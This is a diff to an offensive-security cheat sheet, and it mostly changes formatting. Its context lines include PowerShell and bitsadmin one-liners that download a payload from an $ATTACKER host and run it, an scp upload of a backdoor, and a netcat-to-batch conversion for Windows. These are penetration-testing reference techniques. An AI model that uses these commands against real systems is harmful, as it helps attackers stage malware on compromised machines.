@@ -173,6 +173,7 @@ ftp -s:ftp-commands.txt
 powershell.exe -Command "& {(New-Object Net.WebClient).DownloadFile('http://$ATTACKER/file.exe', 'C:\file.exe')}"
 powershell.exe -Command "& {Invoke-WebRequest 'http://$ATTACKER/file.exe' -OutFile 'C:\file.exe'}"
 ```
+
 ##### HTTP: VBScript
 Copy and paste contents of [wget-cscript](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript) into a Windows Shell and then:
 ```
@@ -187,21 +188,17 @@ scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
 ```
 
 ##### HTTP: Windows "debug.exe" Method
-In Linux, convert binary to hex ascii:
+
 ```bash
+# 1. In Linux, convert binary to hex ascii:
 wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
-```
-Then paste nc.txt into Windows Shell.
+# 2. Paste nc.txt into Windows Shell.
 
 
 ##### HTTP: Windows BitsAdmin
 ```bash
 cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
 ```
-
-
-
-
 
 ### Bash Ping Sweeper
 ```bash
